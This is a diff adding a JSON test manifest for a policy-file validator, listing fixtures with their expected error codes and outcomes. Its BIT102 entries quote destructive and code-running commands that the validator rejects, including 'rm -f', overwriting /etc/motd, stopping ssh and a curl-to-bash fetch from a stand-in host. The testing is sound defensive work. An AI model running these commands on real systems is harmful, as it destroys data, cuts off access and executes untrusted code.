+   "element": "Policy/PolicyStatus"
+  },
+  {
+   "file": "content/bit003-empty.bit",
+   "codes": [
+    "BIT003"
+   ],
+   "note": "PolicyStatus ''",
+   "sha256": "16e8f74dac1b7f5d79b241f077f307c3192d2067ff8249937b9eb7b840cc8c96",
+   "outcome": "rejected",
+   "lines": [
+    6
+   ],
+   "element": "Policy/PolicyStatus"
+  },
+  {
+   "file": "content/bit003-enabled-space-inside.bit",
+   "codes": [
+    "BIT003"
+   ],
+   "note": "PolicyStatus 'en abled'",
+   "sha256": "71a9fed6a29e34170dbc77d7f181183796484e03fe944ad67687edd3632cbfbc",
+   "outcome": "rejected",
+   "lines": [
+    6
+   ],
+   "element": "Policy/PolicyStatus"
+  },
+  {
+   "file": "content/bit004-uppercase.bit",
+   "codes": [
+    "BIT004"
+   ],
+   "note": "PluginId '3F6C2A9E-8B1D-4E57-9A3C-2D7F0E6B1C48'",
+   "sha256": "3b76bad2cbdb91c3ab61a9205ff075f05475f83b33dd2f2b0a54a578ffefb137",
+   "outcome": "rejected",
+   "lines": [
+    14
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginId"
+  },
+  {
+   "file": "content/bit004-mixed-case.bit",
+   "codes": [
+    "BIT004"
+   ],
+   "note": "PluginId '3f6c2a9e-8b1d-4E57-9a3c-2d7f0e6b1c48'",
+   "sha256": "d7e406be22f9f1ccb98afa211448aaab29d2f1423740f2100401778e2e183734",
+   "outcome": "rejected",
+   "lines": [
+    14
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginId"
+  },
+  {
+   "file": "content/bit004-braced.bit",
+   "codes": [
+    "BIT004"
+   ],
+   "note": "PluginId '{3f6c2a9e-8b1d-4e57-9a3c-2d7f0e6b1c48}'",
+   "sha256": "16aeba988f3c99d22317879cdbc0c9d368fe59c672babd6fb4ee178d3eca3860",
+   "outcome": "rejected",
+   "lines": [
+    14
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginId"
+  },
+  {
+   "file": "content/bit004-urn.bit",
+   "codes": [
+    "BIT004"
+   ],
+   "note": "PluginId 'urn:uuid:3f6c2a9e-8b1d-4e57-9a3c-2d7f0e6b1c48'",
+   "sha256": "14e9dc60fbea5e1ff644184678b1ae4645041646bf005f46ca9a6a1bf3afa8a6",
+   "outcome": "rejected",
+   "lines": [
+    14
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginId"
+  },
+  {
+   "file": "content/bit004-unhyphenated.bit",
+   "codes": [
+    "BIT004"
+   ],
+   "note": "PluginId '3f6c2a9e8b1d4e579a3c2d7f0e6b1c48'",
+   "sha256": "9d7adf9fe7f24e62c4fc0c21d83cfb1bdfde11ff896110c720991a4a5786178a",
+   "outcome": "rejected",
+   "lines": [
+    14
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginId"
+  },
+  {
+   "file": "content/bit004-short.bit",
+   "codes": [
+    "BIT004"
+   ],
+   "note": "PluginId '3f6c2a9e-8b1d-4e57-9a3c-2d7f0e6b1c4'",
+   "sha256": "2d2992971af782e28fd7aca6658d0f4c1cd7c25b629cf09486b7442946a3a7da",
+   "outcome": "rejected",
+   "lines": [
+    14
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginId"
+  },
+  {
+   "file": "content/bit004-non-hex.bit",
+   "codes": [
+    "BIT004"
+   ],
+   "note": "PluginId '3f6c2a9e-8b1d-4e57-9a3c-2d7f0e6b1c4g'",
+   "sha256": "73d58cbaf17d7cf301e6a2b26a7ceb7b252783ab22799156a0b00efd24b3ec5b",
+   "outcome": "rejected",
+   "lines": [
+    14
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginId"
+  },
+  {
+   "file": "content/bit004-empty.bit",
+   "codes": [
+    "BIT004"
+   ],
+   "note": "PluginId ''",
+   "sha256": "02128235eafdb5df15e7201ff31421d436c834d7840dbdf46028192de2e75bf5",
+   "outcome": "rejected",
+   "lines": [
+    14
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginId"
+  },
+  {
+   "file": "content/bit005-duplicate-id.bit",
+   "codes": [
+    "BIT005"
+   ],
+   "note": "duplicate id, reported on plugin 2",
+   "sha256": "3c2c66fb6bc9a70185c30fa6097910e7c45b9153d2b192f7fb2bc0f168c89692",
+   "outcome": "rejected",
+   "lines": [
+    22
+   ],
+   "element": "Policy/PluginsGroups/Plugin[2]/PluginId"
+  },
+  {
+   "file": "content/bit008-empty.bit",
+   "codes": [
+    "BIT008"
+   ],
+   "note": "Execute empty after trimming",
+   "sha256": "74d549ec4399907b11ae2c8ee2efbc18034f1daa47de1ee9cc674e9a62136b54",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute"
+  },
+  {
+   "file": "content/bit008-whitespace.bit",
+   "codes": [
+    "BIT008"
+   ],
+   "note": "Execute whitespace after trimming",
+   "sha256": "84235ef140ca9b9643e47c4dd9a96ae0a2fefd664f3f708e8136c5d19bfd5799",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute"
+  },
+  {
+   "file": "content/bit008-too-long.bit",
+   "codes": [
+    "BIT008"
+   ],
+   "note": "16,385 characters",
+   "sha256": "1b6e7b32c800342ff6d2b138d23e00dc6425ea2f77ff94bb3cf60db3ece7ca79",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute"
+  },
+  {
+   "file": "content/bit008-at-limit.bit",
+   "codes": [],
+   "note": "16,384 characters accepted",
+   "sha256": "7634ef82d41368fabaa200d7925c8dca3248bc9f029e338ad6c91eeb3dce2bc6",
+   "outcome": "success"
+  },
+  {
+   "file": "content/bit010-unknown.bit",
+   "codes": [
+    "BIT010"
+   ],
+   "note": "Operator 'equal'",
+   "sha256": "6ec9fc25b5315bdcbcd82f10f1b74af8229c1d17c8224c5f90527fd3f0ccb93e",
+   "outcome": "rejected",
+   "lines": [
+    16
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Operator"
+  },
+  {
+   "file": "content/bit010-empty.bit",
+   "codes": [
+    "BIT010"
+   ],
+   "note": "Operator ''",
+   "sha256": "cbe524879b725923cdbdaaf54056fa385c42d9e3e1be600503730f20de3f070a",
+   "outcome": "rejected",
+   "lines": [
+    16
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Operator"
+  },
+  {
+   "file": "content/bit010-spaced.bit",
+   "codes": [
+    "BIT010"
+   ],
+   "note": "Operator 'not equals'",
+   "sha256": "eef99b70000bdbe5511a9701196ee40752112521eaa2b059c4cfaa9fd671e66d",
+   "outcome": "rejected",
+   "lines": [
+    16
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Operator"
+  },
+  {
+   "file": "content/bit010-missing.bit",
+   "codes": [
+    "BIT010"
+   ],
+   "note": "missing Operator in plugin 2 (#2)",
+   "sha256": "6f6c25da11630db8a72a049eb995e92fc92cc8a3bf5aaaa20eb59d887e389550",
+   "outcome": "rejected",
+   "lines": [
+    19,
+    24
+   ],
+   "element_prefix": "Policy/PluginsGroups/Plugin[2]"
+  },
+  {
+   "file": "content/bit011-missing.bit",
+   "codes": [
+    "BIT011"
+   ],
+   "note": "missing ExpectedResult (#2)",
+   "sha256": "35d6b914e67aee71d12d48830ddf15b4a37fdf8786562c962485cf43e9eb93c1",
+   "outcome": "rejected",
+   "lines": [
+    11,
+    17
+   ],
+   "element_prefix": "Policy/PluginsGroups/Plugin[1]"
+  },
+  {
+   "file": "content/missing-operator-plus-faults.bit",
+   "codes": [
+    "BIT004",
+    "BIT010"
+   ],
+   "note": "content rules still run with a missing Operator",
+   "sha256": "d0dbd89494c55757f26d5a7d3e876f5d3c47450b638c90cd2cc0cb02613b6f8e",
+   "outcome": "rejected"
+  },
+  {
+   "file": "content/bit012-eq.bit",
+   "codes": [
+    "BIT012"
+   ],
+   "note": "eq abc",
+   "sha256": "333b2a81df466453e0451b3710a5629c3eb6a5ef77e757a32130aaf6e3494f8d",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit012-ne.bit",
+   "codes": [
+    "BIT012"
+   ],
+   "note": "ne abc",
+   "sha256": "86c824865fc1c5669766934bfafe2a17e6af3fc87b01cdcd56c47222233b30d3",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit012-gt.bit",
+   "codes": [
+    "BIT012"
+   ],
+   "note": "gt abc",
+   "sha256": "c663aab4b7cbe122bfa99b2e88291d364aa1469764d5412f40793106f36d9dab",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit012-ge.bit",
+   "codes": [
+    "BIT012"
+   ],
+   "note": "ge abc",
+   "sha256": "8c1585b07b0fb59d4d929b5265b755f7768f7b4df55bb3fb482de8f08b356561",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit012-lt.bit",
+   "codes": [
+    "BIT012"
+   ],
+   "note": "lt abc",
+   "sha256": "46657571f1a3e75f1a47b44a4f98c31d37311fa8da62fbb3f5bec6e3181b069a",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit012-le.bit",
+   "codes": [
+    "BIT012"
+   ],
+   "note": "le abc",
+   "sha256": "695e243844b11f9199764534662b9d871d241401dea4caf2e5c65b670c5a3278",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit013-lookahead.bit",
+   "codes": [
+    "BIT013"
+   ],
+   "note": "regex (?=x)",
+   "sha256": "a4e2d42f413982d5cce128fe02a9deb072e1ccdfbd3e55314b10fdfde697389a",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit013-backref.bit",
+   "codes": [
+    "BIT013"
+   ],
+   "note": "regex (a)\\1",
+   "sha256": "34256b4e16761113150a2b7777339bb038dee0bba653421c8aad401ae8f6953f",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit013-bracket.bit",
+   "codes": [
+    "BIT013"
+   ],
+   "note": "not_regex [",
+   "sha256": "228baf60c84c106fd89f017ea97b83717ae75e94e36610833b24f0a5ec194246",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit013-lookbehind.bit",
+   "codes": [
+    "BIT013"
+   ],
+   "note": "not_regex (?&lt;!a)b",
+   "sha256": "d74264ecbe35f7ce32de54474f8f406081672e39ab396b2d4c222c0d7fdad5e6",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit014-empty-with-value.bit",
+   "codes": [
+    "BIT014"
+   ],
+   "note": "empty 'x'",
+   "sha256": "2ec1115f81dfcdcea51145663566e04e6aa058312e24a50f1892788443accbd9",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit014-not-empty-with-value.bit",
+   "codes": [
+    "BIT014"
+   ],
+   "note": "not_empty 'x'",
+   "sha256": "bfb24d9a019738725eb14a0c2edc300004c9fe019450c1102b2dbcc519fcd1b9",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit014-equals-empty.bit",
+   "codes": [
+    "BIT014"
+   ],
+   "note": "equals ''",
+   "sha256": "253e50c8e3c6257268e96476eb7cec616c62ae8930880ad5162cc0ab8945eb95",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit014-regex-whitespace.bit",
+   "codes": [
+    "BIT014"
+   ],
+   "note": "regex '  \\t '",
+   "sha256": "07d5516bcc78f095b4798e978a90b70300ba2a8fe98d56b6ef858ef6dde2df9a",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit016-1.1.bit",
+   "codes": [
+    "BIT016"
+   ],
+   "note": "formatVersion '1.1'",
+   "sha256": "2c68e1c73fa7cd39a8f12f4f37c41f3a78e24d735e6c57c242d6b0e2ecac9362",
+   "outcome": "rejected",
+   "lines": [
+    3
+   ],
+   "element": "Policy/@formatVersion"
+  },
+  {
+   "file": "content/bit016-1.00.bit",
+   "codes": [
+    "BIT016"
+   ],
+   "note": "formatVersion '1.00'",
+   "sha256": "b1b579402c471fb6785db9116602405194616726fd126bf8fb83abd600c2e66c",
+   "outcome": "rejected",
+   "lines": [
+    3
+   ],
+   "element": "Policy/@formatVersion"
+  },
+  {
+   "file": "content/bit016-empty.bit",
+   "codes": [
+    "BIT016"
+   ],
+   "note": "formatVersion ''",
+   "sha256": "875dc4b750be2d50cfe3d5cf7eb65ce72bee22ec392af898df5733a9917feb13",
+   "outcome": "rejected",
+   "lines": [
+    3
+   ],
+   "element": "Policy/@formatVersion"
+  },
+  {
+   "file": "content/bit016-2.0.bit",
+   "codes": [
+    "BIT016"
+   ],
+   "note": "formatVersion '2.0'",
+   "sha256": "344f9f18fc23d4585ae76f0c24de9d6f58233ee79d386404d2dc2d684f0d822c",
+   "outcome": "rejected",
+   "lines": [
+    3
+   ],
+   "element": "Policy/@formatVersion"
+  },
+  {
+   "file": "content/bit017-timeout-0.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "timeout '0'",
+   "sha256": "e59284251c11c588ebe536d28a4d3cf6d8e9f9d43712933a2f650e4219397568",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute/@timeout"
+  },
+  {
+   "file": "content/bit017-timeout-601.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "timeout '601'",
+   "sha256": "47e04ee44371f7d0ac1ec652582180216096c0c1dec157c08103994f6da9762c",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute/@timeout"
+  },
+  {
+   "file": "content/bit017-timeout-30s.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "timeout '30s'",
+   "sha256": "6437ac59423e86e2d677c995e27c27c3fbffeabb03178dc17ece9ad4755e65c1",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute/@timeout"
+  },
+  {
+   "file": "content/bit017-timeout-1.5.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "timeout '1.5'",
+   "sha256": "3ba401bebfa41a931da84f41db448f4001cf1b7adbc20db1f9270b2dd987dff2",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute/@timeout"
+  },
+  {
+   "file": "content/bit017-timeout-minus1.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "timeout '-1'",
+   "sha256": "ca67d13a7085ede2be26bdf60f3ecbe33611929574d3ff5df383996d4eb565d6",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute/@timeout"
+  },
+  {
+   "file": "content/bit017-timeout-plus5.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "timeout '+5'",
+   "sha256": "24acf439bbe188e64e972986a0a12848bc438cab4aeeab690e279a795372c6e6",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute/@timeout"
+  },
+  {
+   "file": "content/bit017-timeout-space30.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "timeout ' 30'",
+   "sha256": "e81323b3ed33c3bcf4dcb308a81dc30bafaaee72c65aabe06a1125a19789afc0",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute/@timeout"
+  },
+  {
+   "file": "content/bit017-timeout-empty.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "timeout ''",
+   "sha256": "03c4da7eb53f43b6d012a01743d84cc22675e17c75b0dc4599329e106d8a0b67",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute/@timeout"
+  },
+  {
+   "file": "content/bit017-timeout-arabic.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "timeout '٣٠'",
+   "sha256": "d57346152465a68f64f0288f3656da62b85a661b3777797c33faa302a9d7537e",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute/@timeout"
+  },
+  {
+   "file": "content/bit017-policyname-at-limit.bit",
+   "codes": [],
+   "note": "PolicyName at its limit (128 characters) is accepted",
+   "sha256": "56476121776337c8cd5616b34e175b87b50a8256d524f82fd218ece2a3655ee2",
+   "outcome": "success"
+  },
+  {
+   "file": "content/bit017-policyname-over-limit.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "PolicyName 129 chars",
+   "sha256": "c549006706716c7cb46fdd8e3c791df3c1587878559982a3ddf88e056ea5a8df",
+   "outcome": "rejected",
+   "lines": [
+    4
+   ],
+   "element": "Policy/PolicyName"
+  },
+  {
+   "file": "content/bit017-policydescription-at-limit.bit",
+   "codes": [],
+   "note": "PolicyDescription at its limit (4000 characters) is accepted",
+   "sha256": "873e415bfee932dd81627052be6243e3b214d40f9e35ae7766f606681494ead4",
+   "outcome": "success"
+  },
+  {
+   "file": "content/bit017-policydescription-over-limit.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "PolicyDescription 4001 chars",
+   "sha256": "2cc7daf0e437f0f658b353da8f9a79b8f11c9b481ce30f0a95c055706828f5bf",
+   "outcome": "rejected",
+   "lines": [
+    5
+   ],
+   "element": "Policy/PolicyDescription"
+  },
+  {
+   "file": "content/bit017-familyname-at-limit.bit",
+   "codes": [],
+   "note": "FamilyName at its limit (128 characters) is accepted",
+   "sha256": "78b471763e4e4bc59adc23aa4ed0b9b18f2a5e4746a6850a51ba23e72a3b7f46",
+   "outcome": "success"
+  },
+  {
+   "file": "content/bit017-familyname-over-limit.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "FamilyName 129 chars",
+   "sha256": "c05a790823fc48532840e35329fd41c24b1708f0682e1cabb6815ddbdc737471",
+   "outcome": "rejected",
+   "lines": [
+    8
+   ],
+   "element": "Policy/Family/FamilyName"
+  },
+  {
+   "file": "content/bit017-pluginname-at-limit.bit",
+   "codes": [],
+   "note": "PluginName at its limit (255 characters) is accepted",
+   "sha256": "6d7ea3e7f0c0064956d67bc9bb2f07133178dfc02700681b6bf61d71889d48be",
+   "outcome": "success"
+  },
+  {
+   "file": "content/bit017-pluginname-over-limit.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "PluginName 256 chars",
+   "sha256": "e941225d493da06a54483ab4201237c55188b5253e1054870c19ba52cbf2c758",
+   "outcome": "rejected",
+   "lines": [
+    12
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginName"
+  },
+  {
+   "file": "content/bit017-plugindescription-at-limit.bit",
+   "codes": [],
+   "note": "PluginDescription at its limit (4000 characters) is accepted",
+   "sha256": "c21889e5525148f0b63202206851b1c27ed415bc67550291519caa8babadd214",
+   "outcome": "success"
+  },
+  {
+   "file": "content/bit017-plugindescription-over-limit.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "PluginDescription 4001 chars",
+   "sha256": "6203fcc84c7691b40c329bedc3d0c4f5ab64e3f08a8b9700ef25cbc76547fa87",
+   "outcome": "rejected",
+   "lines": [
+    13
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginDescription"
+  },
+  {
+   "file": "content/bit017-expectedresult-at-limit.bit",
+   "codes": [],
+   "note": "ExpectedResult at its limit (4000 characters) is accepted",
+   "sha256": "898137ed2eb48a98fd0ab36b785ff00c0b715d2c64954da1e21d80d486cad1ce",
+   "outcome": "success"
+  },
+  {
+   "file": "content/bit017-expectedresult-over-limit.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "ExpectedResult 4001 chars",
+   "sha256": "3c7ac714ba8d0ecc2ebb6e8420dc6fa6c6bb0a30d5b9d1a71ac7cc67eec15c39",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/ExpectedResult"
+  },
+  {
+   "file": "content/bit017-policyname-whitespace.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "PolicyName empty after trimming",
+   "sha256": "76d97e981bc3a6a14ea74408eb48ca273ebae8317710f3320143bfdc07d87ec4",
+   "outcome": "rejected",
+   "lines": [
+    4
+   ],
+   "element": "Policy/PolicyName"
+  },
+  {
+   "file": "content/bit017-familyname-whitespace.bit",
+   "codes": [
+    "BIT017"
+   ],
+   "note": "FamilyName empty after trimming",
+   "sha256": "26d6fc4af2f872b22f8ec89d0384d8ca08ca428845326869f7a4b1839f1ba3cf",
+   "outcome": "rejected",
+   "lines": [
+    8
+   ],
+   "element": "Policy/Family/FamilyName"
+  },
+  {
+   "file": "content/bit017-pluginname-whitespace.bit",
+   "codes": [
+    "BIT017",
+    "BIT101"
+   ],
+   "note": "PluginName empty after trimming",
+   "sha256": "d8391452a6434eda4e4e07a0d79a6e767ff83d1c408aa591c9e33ae4650b9a23",
+   "outcome": "rejected",
+   "lines": [
+    12
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginName"
+  },
+  {
+   "file": "content/bit101-no-control-ref.bit",
+   "codes": [
+    "BIT101"
+   ],
+   "note": "warning only: success",
+   "sha256": "064dfe61ddd1a46daaeec59102642cf61bd51d95ea279247bbe08fb61f40f37f",
+   "outcome": "success",
+   "lines": [
+    12
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginName"
+  },
+  {
+   "file": "content/bit101-arabic-digits.bit",
+   "codes": [
+    "BIT101"
+   ],
+   "note": "warning only: success",
+   "sha256": "e62d0bf59b0f28541414acad46ff497b598ba8fde1d46a439ababf169608f0c2",
+   "outcome": "success",
+   "lines": [
+    12
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginName"
+  },
+  {
+   "file": "content/bit103-long-control-ref.bit",
+   "codes": [
+    "BIT103"
+   ],
+   "note": "warning only: success",
+   "sha256": "0d68dbf29a998bd21d85f05fe108251bddc4437cbf3cab51ac6ae2e08c8c1c7a",
+   "outcome": "success",
+   "lines": [
+    12
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/PluginName"
+  },
+  {
+   "file": "content/bit102-rm.bit",
+   "codes": [
+    "BIT102"
+   ],
+   "note": "write-like or code-running: rm -f /etc/issue.net",
+   "sha256": "bd38cabf976954d58039863d3f2a03b38b73467df12afe2bda88705b43083fb3",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute"
+  },
+  {
+   "file": "content/bit102-redirect.bit",
+   "codes": [
+    "BIT102"
+   ],
+   "note": "write-like or code-running: echo pwned > /etc/motd",
+   "sha256": "bda822d00b05f521e1dc2fef9799f62b36a31f6fc529a90f0fa74396bdc06c91",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute"
+  },
+  {
+   "file": "content/bit102-systemctl-stop.bit",
+   "codes": [
+    "BIT102"
+   ],
+   "note": "write-like or code-running: systemctl stop ssh",
+   "sha256": "3e7d7ddc03f6c44fd2daa9e7dd678c8f05e1d5bc99c01b0dd345a7874e1b0daa",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute"
+  },
+  {
+   "file": "content/bit102-sed-i.bit",
+   "codes": [
+    "BIT102"
+   ],
+   "note": "write-like or code-running: sed -i 's/a/b/' /etc/hosts",
+   "sha256": "3193925058d7ee3319694014586eb68bcb1a75d08e768f2c9bcbeb47bd2f4cff",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute"
+  },
+  {
+   "file": "content/bit102-bash-c-subst.bit",
+   "codes": [
+    "BIT102"
+   ],
+   "note": "write-like or code-running: bash -c \"$(curl -s http://example.invalid/x)\"",
+   "sha256": "2ede9aff8b16d0ae5a111f56b971b9805127c0a6b6af98503833189003467f76",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute"
+  },
+  {
+   "file": "content/bit102-unlexable.bit",
+   "codes": [
+    "BIT102"
+   ],
+   "note": "write-like or code-running: echo \"unterminated",
+   "sha256": "937fe317de0ccd94f0a2de1e708d37f3c298b92338e173a4033025399515b02a",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ],
+   "element": "Policy/PluginsGroups/Plugin[1]/Execute"
+  },
+  {
+   "file": "content/three-faults.bit",
+   "codes": [
+    "BIT003",
+    "BIT004",
+    "BIT012"
+   ],
+   "note": "all three reported, ordered by line",
+   "sha256": "8007bfa4942f0a46f5cb2538d614447af20267bc6927db806051235ff4630397",
+   "outcome": "rejected",
+   "lines": [
+    6,
+    14,
+    25
+   ]
+  },
+  {
+   "file": "content/warning-with-error.bit",
+   "codes": [
+    "BIT101",
+    "BIT010"
+   ],
+   "note": "rejected with the warning listed",
+   "sha256": "12ab437ed030c3d18d524b5bdb1a41f2a6c5c9af64778d75b1f5cc0b9c58289f",
+   "outcome": "rejected"
+  },
+  {
+   "file": "db/bit007-a.bit",
+   "codes": [],
+   "note": "BIT007 pair, first",
+   "sha256": "acb6db2837a271f6595c61f18087a420dafc3bc2df68e9e625299dafdb1f3e03",
+   "outcome": "success"
+  },
+  {
+   "file": "db/bit007-b.bit",
+   "codes": [
+    "BIT007"
+   ],
+   "note": "BIT007 when a.bit exists in the server folder",
+   "sha256": "90bf81da171fc52fb83fc28ba7f6b961a51456da163e27906fbe557ce2826d3d",
+   "outcome": "rejected",
+   "element": "Policy/PolicyName"
+  },
+  {
+   "file": "db/bit015-owner.bit",
+   "codes": [],
+   "note": "BIT015 pair, owner",
+   "sha256": "e0f418df6ef3df08aad2a40d4a7a1e38959d82ef4cc495c7c818c000bf97ce58",
+   "outcome": "success"
+  },
+  {
+   "file": "db/bit015-claimer.bit",
+   "codes": [
+    "BIT015"
+   ],
+   "note": "BIT015 while the owner is not deleted and still lists it",
+   "sha256": "700d31652d66642018bc82620b74ad6af0e3c7f35fa557340b17be5802a38370",
+   "outcome": "rejected",
+   "element": "Policy/PluginsGroups/Plugin[2]/PluginId"
+  },
+  {
+   "file": "db/bit015-owner-dropped.bit",
+   "codes": [],
+   "note": "re-import of the owner without the shared id",
+   "sha256": "15647b33cb13092370a204fa29e4c112121c70decc2e1528dc29ccbf6af4b79f",
+   "outcome": "success"
+  }
+ ]
+}
